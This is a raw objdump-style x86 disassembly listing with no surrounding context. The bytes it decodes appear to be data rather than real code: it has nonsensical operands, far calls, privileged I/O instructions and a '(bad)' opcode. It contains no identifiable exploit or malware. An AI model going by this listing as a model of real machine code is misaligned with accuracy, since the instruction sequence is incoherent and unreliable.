  4026d4:	adc    eax,0x2a2830
  4026d9:	sbb    al,BYTE PTR [edx]
  4026db:	and    ecx,DWORD PTR [eax+0x8]
  4026de:	nop
  4026df:	and    BYTE PTR [edx+edx*1+0x2884003],cl
  4026e6:	nop
  4026e7:	add    BYTE PTR [eax],al
  4026e9:	add    BYTE PTR es:[eax-0x5a2ffef7],0x4
  4026f1:	push   es
  4026f2:	add    DWORD PTR [ebx+0x11],edx
  4026f5:	add    BYTE PTR [eax-0x3f],cl
  4026f8:	pusha  
  4026f9:	loopne 0x4026ff
  4026fb:	test   BYTE PTR ds:0x86100920,al
  402701:	add    al,0x88
  402703:	pop    ss
  402704:	or     ah,BYTE PTR [edx+0x40128000]
  40270a:	and    BYTE PTR [ecx],0x31
  40270d:	and    eax,0xa0e1064a
  402712:	push   es
  402713:	add    BYTE PTR [eax],dl
  402715:	sub    al,0x51
  402717:	adc    al,BYTE PTR [edx]
  402719:	mov    ds:0xb806,al
  40271e:	add    DWORD PTR [ebx+0x10402441],eax
  402724:	inc    ebp
  402725:	or     al,0x34
  402727:	xchg   ecx,eax
  402728:	add    BYTE PTR [ecx],al
  40272a:	ja     0x40272c
  40272c:	mov    BYTE PTR [eax+ebx*2],cl
  40272f:	adc    al,BYTE PTR [esi]
  402731:	test   al,0x1
  402733:	push   edx
  402734:	adc    DWORD PTR gs:[eax+0x44000800],0x40
  40273c:	and    BYTE PTR [eax+eax*4+0x70874018],0x66
  402744:	add    al,BYTE PTR [edx]
  402746:	or     BYTE PTR [eax+0x2d],cl
  402749:	inc    edi
  40274a:	and    BYTE PTR [eax+0x8380800],al
  402750:	push   es
  402751:	mov    ds:0x9991206,al
  402756:	inc    eax
  402757:	inc    ebp
  402758:	inc    eax
  402759:	sub    BYTE PTR [eax],al
  40275b:	inc    edx
  40275c:	inc    ebx
  40275d:	adc    BYTE PTR [eax+0x40],ah
  402760:	adc    al,BYTE PTR [eax-0x7f]
  402763:	xor    BYTE PTR [esi],0x80
  402766:	and    ebp,DWORD PTR [eax+eax*1+0x48]
  40276a:	test   al,0x0
  40276c:	sbb    BYTE PTR [edx],ah
  40276e:	and    edi,DWORD PTR [ecx+0x29]
  402771:	push   eax
  402772:	add    BYTE PTR [ecx+0x4020504],dh
  402778:	add    BYTE PTR [edx],ah
  40277a:	add    al,0x40
  40277c:	call   DWORD PTR ds:0x44a1d0
  402782:	and    DWORD PTR [eax+0x44],eax
  402785:	xor    eax,DWORD PTR [edx]
  402787:	add    cl,BYTE PTR [eax+eax*4+0x44]
  40278b:	xchg   esi,eax
  40278c:	add    BYTE PTR [eax],al
  40278e:	or     BYTE PTR [eax-0x3f],al
  402791:	push   cs
  402792:	mov    ds:0x43220260,al
  402797:	dec    edx
  402798:	cmp    BYTE PTR [eax+eax*1+0x55000],0x83
  4027a0:	or     al,0x48
  4027a2:	add    BYTE PTR [ecx+0x5c],al
  4027a5:	cmp    BYTE PTR [edx],al
  4027a7:	rol    BYTE PTR [eax-0x7b],0x5a
  4027ab:	mov    DWORD PTR [eax],eax
  4027ad:	push   eax
  4027ae:	nop
  4027af:	add    al,BYTE PTR [eax+0x10100041]
  4027b5:	or     al,0x8
  4027b7:	mov    DWORD PTR [ecx],ebp
  4027b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027ba:	add    BYTE PTR [edx],0xc0
  4027bd:	add    al,al
  4027bf:	xchg   BYTE PTR [ecx-0x7ff93de4],al
  4027c5:	xor    eax,0x878003
  4027ca:	xchg   ebp,eax
  4027cb:	imul   eax,DWORD PTR [eax-0x78],0x2a474120
  4027d2:	add    BYTE PTR [ebp-0x76],bl
  4027d5:	push   0xa
  4027d7:	inc    ecx
  4027d8:	add    BYTE PTR [edx],0x0
  4027db:	es mov cl,0x12
  4027de:	pusha  
  4027df:	add    edx,DWORD PTR [esp+eax*1]
  4027e2:	and    DWORD PTR [edx],esp
  4027e4:	and    cl,BYTE PTR [eax]
  4027e6:	rol    BYTE PTR [ecx],1
  4027e8:	adc    BYTE PTR [edx+0x28],ch
  4027eb:	test   al,0x40
  4027ed:	sub    eax,0x609f0f1
  4027f2:	mov    al,BYTE PTR [eax]
  4027f4:	or     al,0x2
  4027f6:	pusha  
  4027f7:	add    BYTE PTR [edx],al
  4027f9:	fs in  al,dx
  4027fb:	pop    eax
  4027fc:	push   eax
  4027fd:	add    bh,BYTE PTR [edx]
  4027ff:	inc    esp
  402800:	xchg   BYTE PTR [edx+0x4809c058],cl
  402806:	add    edx,DWORD PTR [edx]
  402808:	add    DWORD PTR [ecx],edx
  40280a:	or     BYTE PTR [eax+0x1],ah
  40280d:	add    ebx,DWORD PTR [eax+0x44460808]
  402813:	push   cs
  402814:	adc    al,0x42
  402816:	and    DWORD PTR [eax-0x7bcdf5f3],ebx
  40281c:	push   ebx
  40281d:	mov    ds:0x9c000888,al
  402822:	add    al,0x48
  402824:	mov    al,ds:0x1320c250
  402829:	inc    esp
  40282a:	ret    0x8db0
  40282d:	inc    ebx
  40282e:	add    BYTE PTR [esi+eax*4],ah
  402831:	shl    BYTE PTR [eax],0x1
  402834:	imul   ebp,DWORD PTR [edx],0xa2910808
  40283a:	or     BYTE PTR [eax],cl
  40283c:	test   BYTE PTR [eax],ah
  40283e:	or     al,0x0
  402840:	loopne 0x402882
  402842:	cmp    eax,0x120cb560
  402847:	inc    esp
  402848:	arpl   WORD PTR [eax-0x7f3ff056],cx
  40284e:	inc    esi
  40284f:	dec    eax
  402850:	add    al,0x2
  402852:	sbb    BYTE PTR [eax+0x19139104],dl
  402858:	and    ch,0x1
  40285b:	pop    ecx
  40285c:	and    dl,BYTE PTR [eax+eiz*1+0x41]
  402860:	test   BYTE PTR [eax+0x1],cl
  402863:	push   es
  402864:	add    BYTE PTR [edx+0x42],al
  402867:	push   ebp
  402868:	dec    ecx
  402869:	or     DWORD PTR [ebp+0x2],eax
  40286c:	and    ah,BYTE PTR [eax]
  40286e:	add    esp,DWORD PTR [ecx+eax*1]
  402871:	or     dl,BYTE PTR [edx-0x5dc5fff4]
  402877:	xchg   edx,eax
  402878:	pusha  
  402879:	and    al,0x90
  40287b:	add    cl,BYTE PTR ds:[ecx+0x0]
  40287f:	and    BYTE PTR [eax+0x11845290],cl
  402885:	push   es
  402886:	push   eax
  402887:	add    dh,ch
  402889:	xchg   edx,eax
  40288a:	or     DWORD PTR [edx+0xd00a705],esp
  402890:	inc    esp
  402891:	or     DWORD PTR [eax],eax
  402893:	jo     0x4028f5
  402895:	adc    DWORD PTR [eax+0x56],eax
  402898:	or     DWORD PTR ds:0xc6c80062,eax
  40289e:	loopne 0x402900
  4028a0:	or     al,0x72
  4028a2:	les    eax,FWORD PTR [edx]
  4028a4:	add    DWORD PTR ds:0x2030808a,0x22420002
  4028ae:	shl    al,0x20
  4028b1:	fdiv   QWORD PTR [eax+eax*2]
  4028b4:	loopne 0x4028b6
  4028b6:	adc    BYTE PTR [edx-0x80],0x3d
  4028ba:	add    al,BYTE PTR [edx+eax*2]
  4028bd:	add    BYTE PTR [eax+0x4],0x40
  4028c1:	inc    eax
  4028c2:	or     bl,BYTE PTR [eax+0x40000204]
  4028c8:	adc    BYTE PTR [ecx],al
  4028ca:	mov    al,ds:0x10001117
  4028cf:	adc    BYTE PTR [ebx-0x2f],cl
  4028d2:	add    BYTE PTR [edx],ah
  4028d4:	add    dl,BYTE PTR [ecx]
  4028d6:	adc    ecx,edx
  4028d8:	nop
  4028d9:	and    BYTE PTR [ecx],cl
  4028db:	into   
  4028dc:	and    eax,0xc5c5420
  4028e1:	sub    BYTE PTR [edx],ch
  4028e3:	add    al,ah
  4028e5:	add    BYTE PTR [ecx],cl
  4028e7:	or     al,BYTE PTR [eax]
  4028e9:	adc    BYTE PTR [eax+eax*1],al
  4028ec:	add    BYTE PTR [esi-0x57ffb000],0x40
  4028f3:	call   0xc000:0x8810042d
  4028fa:	lock add DWORD PTR es:[esp+ecx*1],eax
  4028ff:	push   edi
  402900:	and    al,0xe
  402902:	ror    DWORD PTR [edx+eax*1],0x80
  402906:	pusha  
  402907:	push   es
  402908:	add    dl,cl
  40290a:	push   ecx
  40290b:	inc    esp
  40290c:	add    BYTE PTR [edx-0x77],0x8
  402910:	or     al,0x10
  402912:	and    bh,BYTE PTR [ebx+0x2]
  402915:	sbb    eax,0x4a903038
  40291a:	add    al,0x22
  40291c:	ror    BYTE PTR ds:0x1f400d43,0x13
  402923:	rcr    BYTE PTR [ecx-0x76],0x20
  402927:	cwde   
  402928:	add    DWORD PTR [ecx-0x40],eax
  40292b:	inc    edx
  40292c:	add    BYTE PTR [ecx],ah
  40292e:	nop
  40292f:	add    al,0x0
  402931:	add    BYTE PTR [edx],cl
  402933:	push   es
  402934:	or     BYTE PTR [eax-0x5f],cl
  402937:	push   ecx
  402938:	add    BYTE PTR [edx+0x22],bl
  40293b:	jl     0x402968
  40293d:	add    al,0x9
  40293f:	adc    BYTE PTR [eax+eiz*2+0x408a043c],al
  402946:	cmp    BYTE PTR [eax],bl
  402948:	add    DWORD PTR [eax],esi
  40294a:	popa   
  40294b:	adc    dl,BYTE PTR [ecx]
  40294d:	and    BYTE PTR [ecx-0x2ffd7ffc],0x4
  402954:	push   eax
  402955:	sbb    al,0xac
  402957:	mov    al,ds:0x28632402
  40295c:	xchg   ecx,eax
  40295d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40295e:	add    eax,0x48044a
  402963:	add    BYTE PTR [esi+0x2b4b9650],al
  402969:	rol    DWORD PTR [eax+0x800008],1
  40296f:	mov    al,0x81
  402971:	cmp    ah,BYTE PTR [eax+edx*1]
  402974:	adc    BYTE PTR [esp+eiz*4+0x961021],dl
  40297b:	inc    eax
  40297c:	push   ecx
  40297d:	and    BYTE PTR [ebx+ebp*1],bl
  402980:	clc    
  402981:	or     DWORD PTR [ecx],edi
  402983:	and    al,bl
  402985:	dec    esp
  402986:	add    al,0x88
  402988:	and    BYTE PTR [eax+0x1140101a],0x22
  40298f:	inc    eax
  402990:	and    BYTE PTR [edx],ah
  402992:	sub    al,0xc3
  402994:	ror    dl,1
  402996:	adc    ecx,DWORD PTR [eax+0x2001990]
  40299c:	sub    al,0x20
  40299e:	add    BYTE PTR [eax],al
  4029a0:	dec    esp
  4029a1:	mov    WORD PTR [edx],cs
  4029a3:	icebp  
  4029a4:	lds    edx,FWORD PTR [eax-0x4dabedfb]
  4029aa:	pusha  
  4029ab:	add    BYTE PTR [ebx],0x84
  4029ae:	sub    BYTE PTR fs:[ebx+edi*1+0x1480720],dl
  4029b6:	push   edx
  4029b7:	pusha  
  4029b8:	jae    0x4029ce
  4029ba:	push   0x10
  4029bc:	inc    eax
  4029bd:	add    al,0x88
  4029bf:	test   BYTE PTR [eax+0x4],al
  4029c2:	jmp    0x8218:0xc919c20a
  4029c9:	push   eax
  4029ca:	xor    BYTE PTR [eax],dl
  4029cc:	adc    BYTE PTR [eax+0x8],al
  4029cf:	add    BYTE PTR es:[eax+0x14],ah
  4029d3:	or     al,0x32
  4029d5:	add    BYTE PTR [eax],ch
  4029d7:	adc    BYTE PTR [eax],ch
  4029d9:	xor    ah,BYTE PTR [eax]
  4029db:	add    al,0x8
  4029dd:	adc    ch,BYTE PTR [ecx+ebp*1]
  4029e0:	adc    eax,DWORD PTR [eax]
  4029e2:	add    ah,BYTE PTR ds:0x9c42870
  4029e8:	or     al,0x0
  4029ea:	xchg   BYTE PTR [esi+ebp*1],al
  4029ed:	add    BYTE PTR [eax],dl
  4029ef:	push   eax
  4029f0:	and    eax,0x1b800
  4029f5:	inc    eax
  4029f6:	mov    ebx,cs
  4029f8:	and    BYTE PTR [eax],dl
  4029fa:	rol    DWORD PTR es:[ebx],0x2
  4029fe:	add    al,0x20
  402a00:	add    DWORD PTR [edx+0x20940500],ebp
  402a06:	shr    BYTE PTR [edx+0x20],0x81
  402a0a:	and    BYTE PTR [edx],ah
  402a0c:	inc    esp
  402a0d:	xor    BYTE PTR [eax+eax*1],al
  402a10:	and    BYTE PTR [edx+0x50000007],0x0
  402a17:	or     DWORD PTR [edi],esp
  402a19:	dec    esp
  402a1a:	sbb    ch,BYTE PTR [eax+0x56]
  402a1d:	add    dl,BYTE PTR [eax]
  402a1f:	add    BYTE PTR [eax],al
  402a21:	or     BYTE PTR [eax+edx*1],ah
  402a24:	and    DWORD PTR ds:0x2000c886,ecx
  402a2a:	add    BYTE PTR [eax+0x30],al
  402a2d:	adc    eax,0x100e0801
  402a32:	adc    BYTE PTR [eax-0x776f1f30],ah
  402a38:	add    BYTE PTR [eax],dl
  402a3a:	test   al,0x0
  402a3c:	inc    eax
  402a3d:	enter  0x8810,0x9
  402a41:	inc    ebp
  402a42:	and    BYTE PTR [ecx+0x66c004e3],al
  402a48:	and    BYTE PTR [ebx],ch
  402a4a:	or     BYTE PTR [edx-0x3d3ffff7],0x92
  402a51:	add    eax,ecx
  402a53:	xchg   ecx,eax
  402a54:	sbb    BYTE PTR ds:0x80088015,dl
  402a5a:	or     BYTE PTR [edi],dh
  402a5c:	js     0x402a75
  402a5e:	inc    eax
  402a5f:	add    BYTE PTR [eax+0x10405000],ah
  402a65:	add    DWORD PTR [edx],esp
  402a67:	pusha  
  402a68:	lods   al,BYTE PTR ds:[esi]
  402a69:	push   esp
  402a6a:	rol    DWORD PTR [edx],0x62
  402a6d:	add    BYTE PTR [ecx-0x3bfefdfc],al
  402a73:	add    DWORD PTR [eax],esi
  402a75:	add    al,0x72
  402a77:	add    BYTE PTR [eax-0x60],cl
  402a7a:	dec    ecx
  402a7b:	mov    bl,0x8
  402a7d:	dec    eax
  402a7e:	add    DWORD PTR [ecx+0xc800840],esp
  402a84:	and    al,0x80
  402a86:	add    al,BYTE PTR [eax+0x1]
  402a89:	add    al,0xae
  402a8b:	add    BYTE PTR [edi+ebp*8],al
  402a8e:	or     BYTE PTR [eax],al
  402a90:	add    DWORD PTR [eax+0x10],edx
  402a93:	xor    BYTE PTR [eax],al
  402a95:	add    al,0x83
  402a97:	add    BYTE PTR [ecx+ecx*1],ch
  402a9a:	add    al,0xe
  402a9c:	add    BYTE PTR [eax],cl
  402a9e:	pop    ecx
  402a9f:	or     DWORD PTR [edx+0x4014819],0x1a020982
  402aa9:	and    dl,BYTE PTR [eax+0xd4408]
  402aaf:	cwde   
  402ab0:	push   eax
  402ab1:	add    eax,0x42110384
  402ab6:	add    BYTE PTR [edx],dl
  402ab8:	add    ecx,DWORD PTR [eax]
  402aba:	xor    BYTE PTR [eax],cl
  402abc:	add    BYTE PTR [eax],ah
  402abe:	mov    al,ds:0x28138091
  402ac3:	into   
  402ac4:	add    ebx,eax
  402ac6:	and    dl,BYTE PTR [eax]
  402ac8:	and    al,0xc2
  402aca:	popa   
  402acb:	adc    al,dl
  402acd:	adc    cl,BYTE PTR [eax+edx*4-0x759fbd93]
  402ad4:	add    cl,BYTE PTR [esi+eax*2]
  402ad7:	and    BYTE PTR [eax],ah
  402ad9:	dec    eax
  402ada:	inc    eax
  402adb:	sub    BYTE PTR [eax+eax*1],al
  402ade:	and    BYTE PTR [ecx+0x20810100],ah
  402ae4:	shl    DWORD PTR [esi],0x2
  402ae7:	inc    eax
  402ae8:	sbb    DWORD PTR [eax+0x1602d506],eax
  402aee:	adc    BYTE PTR [eax+0x2c410100],al
  402af4:	add    BYTE PTR [ecx],al
  402af6:	add    ah,BYTE PTR [eax]
  402af8:	sbb    dh,al
  402afa:	add    BYTE PTR [eax+0x10448004],ah
  402b00:	and    BYTE PTR [eax],cl
  402b02:	mov    BYTE PTR [edx],al
  402b04:	adc    BYTE PTR [ebx+0x10],ah
  402b07:	jne    0x402b1a
  402b09:	test   BYTE PTR [eax],al
  402b0b:	js     0x402b0d
  402b0d:	mov    ah,0x82
  402b0f:	add    BYTE PTR [eax],ah
  402b11:	mov    cl,0x40
  402b13:	add    BYTE PTR [ecx],cl
  402b15:	mov    DWORD PTR [edx+edx*1],eax
  402b18:	add    eax,0x8714a842
  402b1d:	or     eax,0x40764000
  402b22:	nop
  402b23:	sub    BYTE PTR [eax],al
  402b25:	add    DWORD PTR [ecx+eax*4],ebp
  402b28:	add    ah,BYTE PTR [ecx]
  402b2a:	and    BYTE PTR [ecx],al
  402b2c:	or     DWORD PTR [eax+0x1e02151],edx
  402b32:	sub    DWORD PTR [ecx],0x4982
  402b38:	nop
  402b39:	and    BYTE PTR [esp+eax*1],dl
  402b3c:	and    BYTE PTR [ecx+0x2a],0x0
  402b40:	and    BYTE PTR [eax+eax*1],al
  402b43:	adc    BYTE PTR [eax+edx*8-0x68],dl
  402b47:	loop   0x402b5a
  402b49:	add    DWORD PTR [edi-0x36],edx
  402b4c:	test   BYTE PTR [ebp+0x22],al
  402b4f:	xchg   BYTE PTR [ecx+0x19],al
  402b52:	inc    ecx
  402b53:	test   BYTE PTR [ecx],ah
  402b55:	add    BYTE PTR [edx],al
  402b57:	rcl    BYTE PTR [edx],1
  402b59:	adc    BYTE PTR [edx],ch
  402b5b:	dec    edx
  402b5c:	or     al,0x80
  402b5e:	push   eax
  402b5f:	call   0x8242b066
  402b64:	(bad)  
  402b65:	add    BYTE PTR [esp+edx*2],dl
  402b68:	add    eax,0x212421c0
  402b6d:	and    BYTE PTR [edx+0x4],0x14
  402b71:	adc    esp,eax
  402b73:	xor    eax,DWORD PTR [eax]
  402b75:	adc    BYTE PTR [eax],al
  402b77:	shr    BYTE PTR [eax],cl
  402b79:	xor    BYTE PTR [eax],al
  402b7b:	mov    BYTE PTR [ecx],al
  402b7d:	dec    ecx
  402b7e:	adc    BYTE PTR [ecx],dl
  402b80:	mov    ds:0x1a003404,al
  402b85:	inc    eax
  402b86:	add    al,0xa1
  402b88:	bound  ecx,QWORD PTR [ecx]
  402b8a:	jb     0x402b8e
  402b8c:	or     al,0xe
  402b8e:	inc    esi
  402b8f:	adc    al,BYTE PTR [eax]
  402b91:	cmp    al,0x12
  402b93:	shl    DWORD PTR [esi],0x12
  402b96:	add    BYTE PTR [eax+0x10c08000],ah
  402b9c:	cmp    al,BYTE PTR ss:0x9218616
  402ba3:	inc    eax
  402ba4:	enter  0x404,0xc4
  402ba8:	pusha  
  402ba9:	sbb    al,0x30
  402bab:	add    BYTE PTR es:[edx],ah
  402bae:	dec    eax
  402baf:	inc    edx
  402bb0:	add    DWORD PTR [ebp+0x0],esp
  402bb3:	or     BYTE PTR [eax],al
  402bb5:	mov    WORD PTR [edx+0x9c00e],es
  402bbb:	and    BYTE PTR [eax],0x0
  402bbe:	or     al,0x83
  402bc0:	add    edx,ecx
  402bc2:	nop
  402bc3:	sub    BYTE PTR [edx],dl
  402bc5:	xor    cl,BYTE PTR [eax]
  402bc7:	mov    BYTE PTR [eax+0x8816001],dl
  402bcd:	or     BYTE PTR [edx+0x20128c20],0x0
  402bd4:	test   al,0x80
  402bd6:	shr    DWORD PTR [eax+eax*4+0x6c2d3400],0xa
  402bde:	inc    esi
  402bdf:	or     al,BYTE PTR [eax]
  402be1:	push   eax
  402be2:	add    DWORD PTR [eax],eax
  402be4:	and    BYTE PTR [eax],al
  402be6:	add    ecx,DWORD PTR [edx]
  402be8:	add    al,0x1
  402bea:	nop
  402beb:	test   al,0x24
  402bed:	add    BYTE PTR ds:0x80882202,ch
  402bf3:	or     BYTE PTR [ecx+0x0],al
  402bf6:	add    BYTE PTR [ecx-0x80],ah
  402bf9:	mov    al,0x48
  402bfb:	test   BYTE PTR [ecx],al
  402bfd:	pop    DWORD PTR fs:[edx]
  402c00:	xor    BYTE PTR [ecx],0x1
  402c03:	test   BYTE PTR [edi],al
  402c05:	fmul   QWORD PTR [edx+0x22e19013]
  402c0b:	icebp  
  402c0c:	and    eax,0xb015104
  402c11:	dec    esi
  402c12:	add    ch,0xcb
  402c15:	push   eax
  402c16:	mov    DWORD PTR [eax],eax
  402c18:	add    DWORD PTR [eax+0x6024a000],eax
  402c1e:	xor    ebp,DWORD PTR [esi]
  402c20:	add    BYTE PTR [edx],bl
  402c22:	dec    ecx
  402c23:	test   al,0x26
  402c25:	add    BYTE PTR [eax+eax*1],dh
  402c28:	add    BYTE PTR [eax],ah
  402c2a:	add    al,0x28
  402c2c:	adc    al,dl
  402c2e:	push   edx
  402c2f:	add    BYTE PTR [eax],al
  402c31:	inc    eax
  402c32:	dec    eax
  402c33:	or     al,BYTE PTR [eax]
  402c35:	add    BYTE PTR [edx],al
  402c37:	adc    eax,0x1100f008
  402c3c:	or     BYTE PTR [eax],al
  402c3e:	mov    WORD PTR [eax+0x34],es
  402c41:	add    al,dl
  402c43:	adc    DWORD PTR [esi+0x1112014a],ecx
  402c49:	adc    eax,DWORD PTR [eax]
  402c4b:	add    BYTE PTR [ecx],bl
  402c4d:	inc    eax
  402c4e:	inc    eax
  402c4f:	xchg   ecx,eax
  402c50:	pop    eax
  402c51:	add    BYTE PTR [eax+0x4c],dl
  402c54:	adc    cl,BYTE PTR [ebp+0x20]
  402c57:	add    BYTE PTR [edi],0x71
  402c5a:	and    al,0x12
  402c5c:	and    DWORD PTR [ecx],esp
  402c5e:	add    BYTE PTR [eax+0x1043310c],0x9
  402c65:	leave  
  402c66:	fiadd  DWORD PTR [edx-0x70]
  402c69:	and    BYTE PTR [eax],bl
  402c6b:	inc    ecx
  402c6c:	dec    ecx
  402c6d:	dec    esp
  402c6e:	mov    al,0x80
  402c70:	and    al,0x88
  402c72:	add    BYTE PTR [edx],al
  402c74:	inc    esp
  402c75:	add    BYTE PTR [edx],0x10
  402c78:	dec    eax
  402c79:	pop    edx
  402c7a:	data16 rcl BYTE PTR [edx+0x3a],0x65
  402c7f:	add    al,0x2
  402c81:	or     BYTE PTR [esi*4+0x31852810],al
  402c88:	xchg   BYTE PTR [eax-0x2edeaff6],al
  402c8e:	and    al,BYTE PTR [eax+0x911803]
  402c94:	adc    BYTE PTR [edx+0x22],0x40
  402c98:	cmp    al,0x80
  402c9a:	xor    BYTE PTR [ebx],cl
  402c9c:	mov    edx,0x21066210
  402ca1:	mov    dl,BYTE PTR [eax]
  402ca3:	add    DWORD PTR [eax],edx
  402ca5:	test   al,0x1
  402ca7:	loopne 0x402cac
  402ca9:	and    BYTE PTR [ecx+eax*4-0x50ddda00],cl
  402cb0:	and    BYTE PTR [eax+eiz*2],bl
  402cb3:	and    BYTE PTR [eax+0x20],0x29
  402cb7:	add    BYTE PTR [eax+0x4b528180],0x88
  402cbe:	inc    ebp
  402cbf:	add    DWORD PTR [ecx+0x10],0x47
  402cc3:	pusha  
  402cc4:	fld    TBYTE PTR [eax]
  402cc6:	or     BYTE PTR [edx+edx*2],al
  402cc9:	add    BYTE PTR [edx],bl
  402ccb:	add    ch,BYTE PTR [eax]
  402ccd:	and    dl,BYTE PTR [esp+ebp*2]
  402cd0:	and    dl,BYTE PTR [esi]
  402cd2:	add    BYTE PTR [eax],al
  402cd4:	or     BYTE PTR [ecx-0x7cd99df8],ah
  402cda:	inc    ecx
  402cdb:	and    al,0x1a
  402cdd:	or     al,al
  402cdf:	add    cl,al
  402ce1:	or     al,0x10
  402ce3:	pusha  
  402ce4:	or     BYTE PTR [eax],cl
  402ce6:	add    BYTE PTR [ecx],al
  402ce8:	inc    edx
  402ce9:	add    eax,0x2c284700
  402cee:	loopne 0x402d00
  402cf0:	or     BYTE PTR [ecx+0x10808492],al
  402cf6:	add    BYTE PTR [eax-0x2b77d730],al
  402cfc:	and    BYTE PTR [edx],0x6
  402cff:	add    al,0xe
  402d01:	inc    eax
  402d02:	adc    BYTE PTR [eax],0x6
  402d05:	sbb    DWORD PTR [ecx],ebp
  402d07:	push   es
  402d08:	ret    0x3282
  402d0b:	mov    ds:0xa00aa022,al
  402d10:	mov    eax,ds:0x842a2342
  402d15:	or     eax,0x2104002a
  402d1a:	xchg   esp,eax
  402d1b:	and    DWORD PTR [eax],eax
  402d1d:	loop   0x402d1f
  402d1f:	and    BYTE PTR [edx],al
  402d21:	inc    esp
  402d22:	sub    al,0x5
  402d24:	adc    BYTE PTR [eax+eax*4],dh
  402d27:	inc    esi
  402d28:	add    BYTE PTR [eax],al
  402d2a:	or     BYTE PTR [eax-0x5fdde954],0xe
  402d31:	inc    eax
  402d32:	or     BYTE PTR [eax+0x8010c80],al
  402d38:	mov    eax,ds:0x86008258
  402d3d:	dec    ebx
  402d3e:	add    BYTE PTR [ebp+0x50381500],dl
  402d44:	adc    BYTE PTR [eax-0x7fc673de],dl
  402d4a:	sbb    BYTE PTR [eax],ah
  402d4c:	pusha  
  402d4d:	sbb    eax,0x449311f0
  402d52:	adc    al,0x10
  402d54:	add    BYTE PTR [eax+0x2ac00c4c],ah
  402d5a:	or     BYTE PTR [esi-0x74],al
  402d5d:	add    al,BYTE PTR ds:0x480f0000
  402d63:	and    dh,al
  402d65:	add    DWORD PTR [eax],0x2424808
  402d6b:	add    BYTE PTR [edx+0x16],0x11
  402d6f:	inc    edx
  402d70:	ret    
  402d71:	dec    ecx
  402d72:	add    ch,BYTE PTR [ecx+0x224b4953]
  402d78:	add    cl,BYTE PTR [eax+0x50]
  402d7b:	inc    eax
  402d7c:	and    BYTE PTR [eax+0x8c3410],0x8
  402d83:	push   es
  402d84:	add    ch,ah
  402d86:	sbb    DWORD PTR [ebx],edx
  402d88:	aad    0x13
  402d8a:	inc    edx
  402d8b:	xor    ah,BYTE PTR [ecx]
  402d8d:	add    al,0x2
  402d8f:	nop
  402d90:	add    al,dh
  402d92:	pusha  
  402d93:	pop    ss
  402d94:	adc    edx,DWORD PTR [ecx]
  402d96:	add    BYTE PTR [eax],ch
  402d98:	cmp    DWORD PTR ds:0x1008680,eax
  402d9e:	add    BYTE PTR [ebx-0x80],dl
  402da1:	cmp    BYTE PTR [edx+0x12],dh
  402da4:	push   eax
  402da5:	add    BYTE PTR [ecx],ah
  402da7:	adc    bl,BYTE PTR [eax-0x2c]
  402daa:	add    al,0x20
  402dac:	repz mov eax,ds:0xa55ad002
  402db2:	and    cl,BYTE PTR [eax]
  402db4:	mov    BYTE PTR [edx+0x28120844],cl
  402dba:	adc    BYTE PTR [edx-0x7f],dh
  402dbd:	add    DWORD PTR [eax+0x48620],edx
  402dc3:	mov    BYTE PTR [ebx],cl
  402dc5:	add    BYTE PTR [eax+eax*1-0x1dffae5b],al
  402dcc:	sub    DWORD PTR [eax+0xc],eax
  402dcf:	mov    BYTE PTR [eax],bl
  402dd1:	or     al,0x5
  402dd3:	rol    DWORD PTR [eax],0x2
  402dd6:	adc    DWORD PTR [ecx],eax
  402dd8:	and    DWORD PTR [edx],ecx
  402dda:	scas   al,BYTE PTR es:[edi]
  402ddb:	adc    bh,BYTE PTR [ebp+0x49804800]
  402de1:	add    BYTE PTR [eax-0x6ef7f7be],cl
  402de7:	adc    eax,0x2040103
  402dec:	rol    BYTE PTR [eax],0x90
  402def:	add    BYTE PTR [eax],al
  402df1:	ror    BYTE PTR [edx],1
  402df3:	and    BYTE PTR [edx-0xdfff900],0x12
  402dfa:	push   eax
  402dfb:	add    edx,DWORD PTR [edx]
  402dfd:	xchg   esp,eax
  402dfe:	adc    BYTE PTR [eax+0x4a9d0340],dl
  402e04:	scas   al,BYTE PTR es:[edi]
  402e05:	ret    
  402e06:	nop
  402e07:	adc    BYTE PTR [ecx],ch
  402e09:	pop    eax
  402e0a:	and    BYTE PTR [esi],ah
  402e0c:	or     BYTE PTR [eax+0x2],al
  402e0f:	or     BYTE PTR [eax],dl
  402e11:	add    al,0x50
  402e14:	add    BYTE PTR ds:0x10e0400,ah
  402e1a:	mov    WORD PTR [esi],ss
  402e1c:	add    BYTE PTR gs:[ecx+eax*2],dl
  402e20:	test   al,0x80
  402e22:	dec    eax
  402e23:	and    al,BYTE PTR ds:0xc8808002
  402e29:	and    al,0x90
  402e2b:	inc    eax
  402e2c:	inc    eax
  402e2d:	push   0x51080022
  402e32:	les    eax,FWORD PTR [edx]
  402e34:	pusha  
  402e35:	mov    cl,0x4
  402e37:	and    BYTE PTR [eax],al
  402e39:	das    
  402e3a:	or     DWORD PTR [eax],0x1082b340
  402e40:	out    0x0,al
  402e42:	adc    al,al
  402e44:	test   al,0x14
  402e46:	adc    BYTE PTR [esi+eax*4],al
  402e49:	adc    al,BYTE PTR [edx-0x75bf99f4]
  402e4f:	adc    BYTE PTR [ecx+eax*1-0x60],al
  402e53:	adc    DWORD PTR [eax],edx
  402e55:	and    al,BYTE PTR [eax+ebx*2]
  402e58:	dec    eax
  402e59:	inc    eax
  402e5a:	inc    esp
  402e5b:	and    al,0x24
  402e5d:	and    BYTE PTR [eax],al
  402e5f:	sub    BYTE PTR [edx],bl
  402e61:	and    BYTE PTR [esp+eax*2],al
  402e64:	mov    BYTE PTR [eax],ch
  402e66:	mov    eax,ds:0x10060004
  402e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e6c:	jmp    0x402e30
  402e6e:	dec    eax
  402e6f:	adc    BYTE PTR [eax],0x0
  402e72:	push   ss
  402e73:	jno    0x402e7d
  402e75:	or     BYTE PTR [ecx+0x40084],dh
  402e7b:	add    al,0x11
  402e7d:	and    dh,BYTE PTR [esi+0x2f]
  402e80:	or     BYTE PTR [esi+eax*1],0x83
  402e84:	dec    esp
  402e85:	adc    ah,BYTE PTR [ebp+eiz*4-0x59e80000]
  402e8c:	cmp    DWORD PTR [esp+esi*1],ebx
  402e8f:	add    BYTE PTR [eax+0x4c301a08],al
  402e95:	inc    eax
  402e96:	add    eax,0x8613210
  402e9b:	add    edx,eax
  402e9d:	or     al,0x82
  402e9f:	inc    ecx
  402ea0:	ret    0x2105
  402ea3:	add    BYTE PTR [eax+0x8],dl
  402ea6:	add    BYTE PTR [ebp+0x0],0x22
  402eaa:	inc    eax
  402eab:	test   BYTE PTR [eax],al
  402ead:	add    BYTE PTR [edx],al
